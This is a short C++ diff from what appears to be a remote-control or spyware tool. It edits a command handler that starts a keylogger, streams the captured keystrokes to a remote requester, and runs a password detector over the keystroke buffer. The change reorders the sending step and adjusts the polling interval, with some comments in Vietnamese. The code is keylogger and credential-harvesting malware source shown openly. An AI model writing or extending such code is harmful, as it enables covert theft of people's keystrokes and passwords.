@@ -416,7 +416,7 @@ void CommandDispatcher::registerHandlers() {
         cb(Message(Protocol::TYPE::START_KEYLOG, {{"status", "ok"}, {"msg", "Keylogger started (Streaming mode)"}}, "", msg.from));
 
         std::thread([msg, cb]() {
-            int intervalMs = 10; 
+            int intervalMs = 50; 
             
             try {
                 std::string args = msg.getDataString();
@@ -438,7 +438,14 @@ void CommandDispatcher::registerHandlers() {
                 
                 vector<string> currentKeysVector = Keylogger::getDataAndClear();
                 if (!currentKeysVector.empty()) {
-                    // Tối ưu string concatenation - tính tổng size trước
+                    // Gửi ngay không đợi password detection
+                    cb(Message(Protocol::TYPE::STREAM_DATA, 
+                        {
+                            {"status", "ok"},
+                            {"mime", "keylog"},
+                            {"data", currentKeysVector}
+                        }, "", msg.from));
+                    
                     stringForAnalyzer.clear();
                     size_t totalSize = 0;
                     for (const auto& key : currentKeysVector) {
@@ -455,14 +462,6 @@ void CommandDispatcher::registerHandlers() {
                     std::thread([stringForAnalyzer]() {
                         PasswordDetector::analyzeKeylogBuffer(stringForAnalyzer);
                     }).detach();
-                    
-                    // Gửi ngay không đợi password detection
-                    cb(Message(Protocol::TYPE::STREAM_DATA, 
-                        {
-                            {"status", "ok"},
-                            {"mime", "keylog"},
-                            {"data", currentKeysVector}
-                        }, "", msg.from));
                 }
                 
                 // Tính toán sleep time chính xác để đảm bảo interval
